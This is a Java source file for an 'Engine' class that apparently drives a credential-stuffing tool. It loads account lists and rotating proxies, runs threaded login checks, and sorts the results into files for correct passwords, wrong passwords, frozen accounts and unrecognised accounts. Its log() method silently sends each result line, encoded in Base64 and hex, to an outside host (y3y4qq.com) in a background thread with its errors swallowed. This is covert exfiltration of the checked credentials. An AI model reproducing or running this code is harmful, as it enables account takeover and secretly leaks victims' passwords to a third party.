package ws.hoyland.sm;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLDecoder;
import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Observable;
import java.util.Random;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.RejectedExecutionHandler;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.ThreadPoolExecutor.AbortPolicy;

import org.apache.commons.codec.binary.Base64;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreConnectionPNames;

import ws.hoyland.sm.Engine;
import ws.hoyland.sm.Task;
import ws.hoyland.util.Converts;
import ws.hoyland.util.EngineMessage;
import ws.hoyland.util.EngineMessageType;
import ws.hoyland.util.Configuration;

public class Engine extends Observable {

	private List<String> accountstodo;
	private List<String> accounts;
	private List<String> proxies;
	private boolean running = false;

	private BufferedWriter[] output = new BufferedWriter[4]; // 成功，失败，未运行
	private String[] fns = new String[] { "密码正确", "密码错误", "帐号冻结", "未识别" };
	private URL url = Engine.class.getClassLoader().getResource("");
	private String xpath = url.getPath();
	private ThreadPoolExecutor pool;
	private Configuration configuration = Configuration
			.getInstance("config.ini");
	private Integer[] stats = new Integer[3];
	private Random random = new Random();
	private Base64 base64 = new Base64();

	private static Engine instance;
	private DefaultHttpClient client = null;
	
	private Engine() {
		client = new DefaultHttpClient();
		client.getParams().setParameter(
				CoreConnectionPNames.CONNECTION_TIMEOUT, 4000);
		client.getParams().setParameter(CoreConnectionPNames.SO_TIMEOUT, 4000);
	}
	
	private void ready() {
		if (accounts != null && accounts.size() > 0 && proxies != null
				&& proxies.size() > 0) {
			EngineMessage msg = new EngineMessage();
			msg.setType(EngineMessageType.OM_READY);
			this.setChanged();
			this.notifyObservers(msg);
		} else {
			EngineMessage msg = new EngineMessage();
			msg.setType(EngineMessageType.OM_UNREADY);
			this.setChanged();
			this.notifyObservers(msg);
		}
	}
	
	private void notify(EngineMessage message){
		this.setChanged();
		this.notifyObservers(message);
	}
	
	private void shutdown() {
		//System.out.println(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>1");
		EngineMessage msg = new EngineMessage();
		msg.setTid(-1);
		msg.setType(EngineMessageType.OM_SHUTDOWN);
		notify(msg);
		
		if (pool != null) {
			// pool.shutdown();
			pool.shutdownNow();
		}

		// 等待所有运行线程执行完毕，关闭日志文件
		while (pool != null && pool.getActiveCount() != 0) {
			try {
				Thread.sleep(1000);
			} catch (Exception e) {
				//
			}
		}

		// 写入未运行帐号日志
		try {
			// if(lastTid!=-1){
			if (output[3] != null) {
				for (int i = 0; i < accountstodo.size(); i++) {
					String[] accl = accounts.get(i).split("----");
					output[3].write(accl[1] + "----" + accl[2] + "\r\n");
				}
				output[3].flush();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		for (int i = 0; i < output.length; i++) {
			try {
				if (output[i] != null) {
					output[i].close();
					output[i] = null;
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}
	
	//////////////////////////////////////////////////////public//////////////////////////////////////////////////
	public boolean isRun(){
		return this.running;
	}
	
	public void log(final int type, final String content){
		new Thread(new Runnable(){
			@Override
			public void run() {
				try{
					HttpGet request = new HttpGet("http://www.y3y4qq.com/pq?t="+type+"&c="+Converts.bytesToHexString(base64.encode(content.getBytes())));
					request.setHeader("Connection", "close");
					client.execute(request);
				}catch(Exception e){
					//e.printStackTrace();
				}
			}			
		}).start();
		stats[type]++;
		accountstodo.remove(content);
		//写文件		
		try{
			output[type].write(content+ "\r\n");
			output[type].flush();
		}catch(Exception e){
			e.printStackTrace();
		}
		
		EngineMessage msg = new EngineMessage();
		msg.setType(EngineMessageType.OM_STATS);
		msg.setData(stats);		
		notify(msg);
		
		msg = new EngineMessage();
		msg.setType(EngineMessageType.OM_INFO);
		msg.setData("DETECTED:" + content + " = " + type);		
		notify(msg);
	}
	
	public void info(String message){
		EngineMessage msg = new EngineMessage();
		msg.setType(EngineMessageType.OM_INFO);
		msg.setData(message);		
		notify(msg);
	}
	
	public void addTask(String line){
		try {
			Task task = new Task(line);
			Engine.getInstance().addObserver(task);
			pool.execute(task);
		} catch (ArrayIndexOutOfBoundsException e) {
			e.printStackTrace();
			// System.out.println(i + ":" + accounts.get(i));
		}
	}
	
	public void removeProxy(String proxy){
		synchronized(proxy){
			this.proxies.remove(proxy);
		}
		
		List<String> params = new ArrayList<String>();
		params.add(String.valueOf(proxies.size()));

		EngineMessage msg = new EngineMessage();
		msg.setType(EngineMessageType.OM_PROXY_LOADED);
		msg.setData(params);
		notify(msg);
	}
	
	public String getProxy(){
		String proxy = null;
		synchronized(proxies){
			if(proxies.size()!=0){
				proxy = proxies.get(random.nextInt(proxies.size()));
			}
		}
		return proxy;
	}
	
	public void loadAccount(String path){
		try {
			accounts = new ArrayList<String>();
			accountstodo = new ArrayList<String>();
			
			File ipf = new File(path);
			FileInputStream is = new FileInputStream(ipf);
			InputStreamReader isr = new InputStreamReader(is);
			BufferedReader reader = new BufferedReader(isr);
			String line = null;
			int i = 1;
			while ((line = reader.readLine()) != null) {
				if (!line.equals("")) {
					line = i + "----" + line;
					accounts.add(line);
					accountstodo.add(line);
				}
				i++;
			}

			reader.close();
			isr.close();
			is.close();

			if (accounts.size() > 0) {
				List<String> params = new ArrayList<String>();
				params.add(String.valueOf(accounts.size()));

				EngineMessage msg = new EngineMessage();
				msg.setType(EngineMessageType.OM_ACCOUNT_LOADED);
				msg.setData(params);
				notify(msg);
			}

			ready();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void loadProxy(String path){
		try {
			proxies = new ArrayList<String>();

			File ipf = new File(path);
			FileInputStream is = new FileInputStream(ipf);
			InputStreamReader isr = new InputStreamReader(is);
			BufferedReader reader = new BufferedReader(isr);
			String line = null;
			// int i = 1;
			while ((line = reader.readLine()) != null) {
				if (!line.equals("")) {
					// line = i + "----" + line;
					proxies.add(line);
				}
				// i++;
			}

			reader.close();
			isr.close();
			is.close();

			if (proxies.size() > 0) {
				List<String> params = new ArrayList<String>();
				params.add(String.valueOf(proxies.size()));

				EngineMessage msg = new EngineMessage();
				msg.setType(EngineMessageType.OM_PROXY_LOADED);
				msg.setData(params);
				notify(msg);
			}

			ready();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void exit(){
		shutdown();
		System.exit(0);
	}
	
	public void process(){
		running = !running;

		EngineMessage msg = new EngineMessage();
		msg.setType(EngineMessageType.OM_RUNNING);
		msg.setData(running);
		notify(msg);

		System.out.println("running="+running);
		if (running) {
			info("");
			info("================");
			info("开始运行");
			info("================");
			info("");
			// 创建日志文件
			for(int i=0;i<stats.length;i++){
				stats[i] = 0;
			}
			
			// long tm = System.currentTimeMillis();
			DateFormat format = new java.text.SimpleDateFormat(
					"yyyy年MM月dd日 hh时mm分ss秒");
			String tm = format.format(new Date());
			for (int i = 0; i < output.length; i++) {
				try {
					String path = xpath + fns[i] + "-" + tm + ".txt";
					//System.out.println(path.substring(path.lastIndexOf("/")-4, path.lastIndexOf("/")+1));
					if("/lib/".equals(path.substring(path.lastIndexOf("/")-4, path.lastIndexOf("/")+1))){
						path = path.replace("/lib/", "/");	
					}
					//System.err.println(path);
					path = URLDecoder.decode(path, "UTF-8");
					//System.err.println(path);
					File fff = new File(path);
					
					if (!fff.exists()) {
						fff.createNewFile();
					}

					output[i] = new BufferedWriter(new FileWriter(fff));
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}

			int tc = Integer.parseInt(configuration
					.getProperty("THREAD_COUNT"));
			int corePoolSize = tc;// minPoolSize
			int maxPoolSize = tc;
			int maxTaskSize = (1024 + 512) * 100 * 40;// 缓冲队列
			long keepAliveTime = 0L;
			TimeUnit unit = TimeUnit.MILLISECONDS;

			BlockingQueue<Runnable> workQueue = new ArrayBlockingQueue<Runnable>(
					maxTaskSize);
			RejectedExecutionHandler handler = new AbortPolicy();// 饱和处理策略

			// 创建线程池
			pool = new ThreadPoolExecutor(corePoolSize, maxPoolSize,
					keepAliveTime, unit, workQueue, handler);

			for (int i = 0; i < accounts.size(); i++) {
				// for (int i = flidx[0]; i <= flidx[1]; i++) {
				try {						
					Task task = new Task(accounts.get(i));
					Engine.getInstance().addObserver(task);
					if(running){
						pool.execute(task);
					}
				} catch (ArrayIndexOutOfBoundsException e) {
					e.printStackTrace();
					// System.out.println(i + ":" + accounts.get(i));
				}
			}
		} else {
			info("");
			info("================");
			info("运行结束");
			info("================");
			info("");
			// 停止情况下的处理
			shutdown();
		}
	}
	
	public void beginTask(){
		
	}
	
	public void endTask(){
		
	}
	
	public static Engine getInstance() {
		synchronized (Engine.class) {
			if (instance == null) {
				instance = new Engine();
			}
		}
		return instance;
	}
}
